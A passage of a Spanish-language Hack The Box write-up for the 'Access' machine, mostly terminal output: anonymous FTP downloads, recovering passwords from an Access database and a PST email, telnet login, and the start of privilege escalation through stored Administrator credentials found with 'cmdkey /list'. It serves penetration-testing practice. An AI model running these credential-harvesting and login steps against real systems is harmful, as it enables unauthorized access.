&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/access# ftp 10.10.10.98
Connected to 10.10.10.98.
&lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; Microsoft FTP Service
Name &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.98:root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: anonymous
&lt;span class=&#34;m&#34;&gt;331&lt;/span&gt; Anonymous access allowed, send identity &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;e-mail name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; as password.
Password:
&lt;span class=&#34;m&#34;&gt;230&lt;/span&gt; User logged in.
Remote system &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; is Windows_NT.
ftp&amp;gt; ls -la
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Opening ASCII mode data connection.
08-23-18  08:16PM       &amp;lt;DIR&amp;gt;          Backups
08-24-18  09:00PM       &amp;lt;DIR&amp;gt;          Engineer
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; Backups
&lt;span class=&#34;m&#34;&gt;250&lt;/span&gt; CWD &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful.
ftp&amp;gt; ls -la
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful.
&lt;span class=&#34;m&#34;&gt;125&lt;/span&gt; Data connection already open&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Transfer starting.
08-23-18  08:16PM              &lt;span class=&#34;m&#34;&gt;5652480&lt;/span&gt; backup.mdb
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
ftp&amp;gt; bin 
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; Type &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; to I.
ftp&amp;gt; get backup.mdb
local: backup.mdb remote: backup.mdb
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful.
&lt;span class=&#34;m&#34;&gt;125&lt;/span&gt; Data connection already open&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Transfer starting.
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
&lt;span class=&#34;m&#34;&gt;5652480&lt;/span&gt; bytes received in 147.73 secs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;37.3663 kB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ../Engineer
&lt;span class=&#34;m&#34;&gt;250&lt;/span&gt; CWD &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful.
ftp&amp;gt; ls -lah
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful.
&lt;span class=&#34;m&#34;&gt;125&lt;/span&gt; Data connection already open&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Transfer starting.
08-24-18  12:16AM                &lt;span class=&#34;m&#34;&gt;10870&lt;/span&gt; Access Control.zip
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
ftp&amp;gt; get Access&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;Control.zip
local: Access Control.zip remote: Access Control.zip
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Opening BINARY mode data connection.
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
&lt;span class=&#34;m&#34;&gt;10870&lt;/span&gt; bytes received in 4.72 secs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2.2477 kB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
ftp&amp;gt; quit
&lt;span class=&#34;m&#34;&gt;221&lt;/span&gt; Goodbye.
root@sckull:~/htb/access# ls
&lt;span class=&#34;s1&#34;&gt;&amp;#39;Access Control.zip&amp;#39;&lt;/span&gt;   backup.mdb
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ahora tenemos dos archivos &amp;lsquo;Access Control.zip&amp;rsquo; y &amp;lsquo;backup.mdb&amp;rsquo;.&lt;/p&gt;
&lt;p&gt;Analizando los archivos de que obtuvimos en FTP, encontramos que backup.mdb es un archivo de Microsoft Access Database y Access Control.zip al intentar descomprimir los archivos dentro, nos pide una contraseña.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/access# file backup.mdb 
backup.mdb: Microsoft Access Database

root@sckull:~/htb/access# file &lt;span class=&#34;s1&#34;&gt;&amp;#39;Access Control.zip&amp;#39;&lt;/span&gt; 
Access Control.zip: Zip archive data, at least v2.0 to extract

root@sckull:~/htb/access# binwalk &lt;span class=&#34;s1&#34;&gt;&amp;#39;Access Control.zip&amp;#39;&lt;/span&gt; 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;             0x0             Zip archive data, encrypted at least v2.0 to extract, compressed size: 10678, uncompressed size: 271360, name: Access Control.pst
&lt;span class=&#34;m&#34;&gt;10848&lt;/span&gt;         0x2A60          End of Zip archive, footer length: &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En el primer archivo utilizamos la pagina &amp;lsquo;&lt;a href=&#34;https://www.mdbopener.com/&#39;&#34;&gt;https://www.mdbopener.com/&#39;&lt;/a&gt; para realizar alguna busqueda de datos que nos pudiesen ayudar de alguna forma en algun otro servicio y encontramos una base de datos de lo que parece ser de una empresa, nos centramos en datos de usuarios y contraseñas y econtramos una tabla que se hace llamar &amp;lsquo;auth_user&amp;rsquo; con los siguientes datos:&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;tablas&#34;&gt;TABLAS&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/access/Screenshot_20190302_211423.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h3 id=&#34;auth_user&#34;&gt;auth_user&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/access/Screenshot_20190302_210754.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizando la contraseña &amp;lsquo;access4u@security&amp;rsquo; para descomprimir los archivos que &amp;lsquo;Access Control.zip&amp;rsquo; contiene, encontramos un archivo &amp;lsquo;Access Control.pst&amp;rsquo;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/access# 7z x &lt;span class=&#34;s1&#34;&gt;&amp;#39;Access Control.zip&amp;#39;&lt;/span&gt; 
7-Zip &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;64&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 16.02 : Copyright &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;locale&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;en_US.UTF-8,Utf16&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;on,HugeFiles&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;on,64 bits,3 CPUs Intel&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;R&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Core&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;TM&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; i5-8250U CPU @ 1.60GHz &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;806EA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,ASM,AES-NI&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Scanning the drive &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; archives:
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; file, &lt;span class=&#34;m&#34;&gt;10870&lt;/span&gt; bytes &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; KiB&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Extracting archive: Access Control.zip
--
&lt;span class=&#34;nv&#34;&gt;Path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; Access Control.zip
&lt;span class=&#34;nv&#34;&gt;Type&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; zip
Physical &lt;span class=&#34;nv&#34;&gt;Size&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;10870&lt;/span&gt;
    
Enter password &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;will not be echoed&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
Everything is Ok         

Size:       &lt;span class=&#34;m&#34;&gt;271360&lt;/span&gt;
Compressed: &lt;span class=&#34;m&#34;&gt;10870&lt;/span&gt;
root@sckull:~/htb/access# ls
&lt;span class=&#34;s1&#34;&gt;&amp;#39;Access Control.pst&amp;#39;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizando readpst para lectura del archivo, nos genera un archivo de tipo mbox.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/access# readpst &lt;span class=&#34;s1&#34;&gt;&amp;#39;Access Control.pst&amp;#39;&lt;/span&gt; 
Opening PST file and indexes...
Processing Folder &lt;span class=&#34;s2&#34;&gt;&amp;#34;Deleted Items&amp;#34;&lt;/span&gt;
	&lt;span class=&#34;s2&#34;&gt;&amp;#34;Access Control&amp;#34;&lt;/span&gt; - &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; items &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;, &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; items skipped.

root@sckull:~/htb/access# ls
&lt;span class=&#34;s1&#34;&gt;&amp;#39;Access Control.mbox&amp;#39;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Para lectura de este archivo utilizamos &amp;lsquo;mail -f Access Control.mbox&amp;rsquo;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/access# mail -f Access&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;Control.mbox 
Status: RO
From: john@megacorp.com &amp;lt;john@megacorp.com&amp;gt;
Subject: MegaCorp Access Control System &lt;span class=&#34;s2&#34;&gt;&amp;#34;security&amp;#34;&lt;/span&gt; account
To: &lt;span class=&#34;s1&#34;&gt;&amp;#39;security@accesscontrolsystems.com&amp;#39;&lt;/span&gt;
Date: Thu, &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt; Aug &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt; 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;nv&#34;&gt;boundary&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;--boundary-LibPST-iamunique-387867163_-_-&amp;#34;&lt;/span&gt;
----boundary-LibPST-iamunique-387867163_-_-
Content-Type: multipart/alternative&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;nv&#34;&gt;boundary&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;alt---boundary-LibPST-iamunique-387867163_-_-&amp;#34;&lt;/span&gt;
--alt---boundary-LibPST-iamunique-387867163_-_-
Content-Type: text/plain&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt;

Hi there,

The password &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

Regards,

John
....
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;telnet---obteniendo-acceso&#34;&gt;Telnet - Obteniendo Acceso&lt;/h2&gt;
&lt;p&gt;Como pudimos observar el archivo &amp;lsquo;Access Control.mbox&amp;rsquo; es un archivo que contiene un email, dentro de el John nos indica que la contraseña para el usuario &amp;lsquo;security&amp;rsquo; fue cambiada a &amp;lsquo;4Cc3ssC0ntr0ller&amp;rsquo;. Aprovechando estos datos procedemos a utilizar el servicio telnet para conectarnos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/access# telnet 10.10.10.98
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is &lt;span class=&#34;s1&#34;&gt;&amp;#39;^]&amp;#39;&lt;/span&gt;.
Welcome to Microsoft Telnet Service 

login: security
password: 

*&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
Microsoft Telnet Server.
*&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ecurity&amp;gt;cd Desktop

C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ecurity&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&amp;gt;dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ecurity&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop

03/03/2019  03:12 AM    &amp;lt;DIR&amp;gt;          .
03/03/2019  03:12 AM    &amp;lt;DIR&amp;gt;          ..
03/03/2019  03:12 AM            73,802 shell.exe
08/21/2018  10:37 PM                &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt; user.txt
               &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; File&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;         73,834 bytes
               &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; Dir&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  16,771,272,704 bytes free

C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ecurity&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&amp;gt;more user.txt
ff1f3b4&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ecurity&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Y asi obtenemos nuestra primera bandera &amp;lsquo;user.txt&amp;rsquo;.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h2&gt;
&lt;p&gt;Enumerando archivos y directorios no encontramos nada, pero al utilizar el comando &amp;lsquo;cmdkey /list&amp;rsquo; encontramos que el usuario Administrator tiene una contraseña guardada.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
